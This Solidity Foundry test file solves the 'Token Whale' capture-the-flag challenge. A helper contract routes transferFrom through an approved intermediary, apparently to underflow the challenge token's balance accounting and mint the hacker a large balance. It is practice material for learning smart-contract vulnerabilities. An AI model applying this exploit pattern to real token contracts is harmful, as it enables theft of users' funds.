// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "src/math/2-token-whale.sol";

// add extra contracts you need to hack here
contract HackHelper {
    function run(TokenWhaleChallenge c, address b, uint256 amount) external {
        c.transferFrom(msg.sender, b, amount);
        c.transfer(msg.sender, 1000000);
    }
}

contract TokenWhaleChallengeTest is Test {
    TokenWhaleChallenge target;
    address hacker;

    function setUp() public {
        hacker = vm.addr(1);
        vm.label(hacker, "Hacker");

        target = new TokenWhaleChallenge(hacker);
    }

    function testChallenge() public {
        vm.startPrank(hacker);

        // your code
        HackHelper helper = new HackHelper();
        target.approve(address(helper), type(uint256).max);

        address hacker2 = vm.addr(2);
        vm.label(hacker2, "Hacker2");

        helper.run(target, hacker2, 1);

        // end of your code
        vm.stopPrank();
        
        assertTrue(target.isComplete());

    }
}
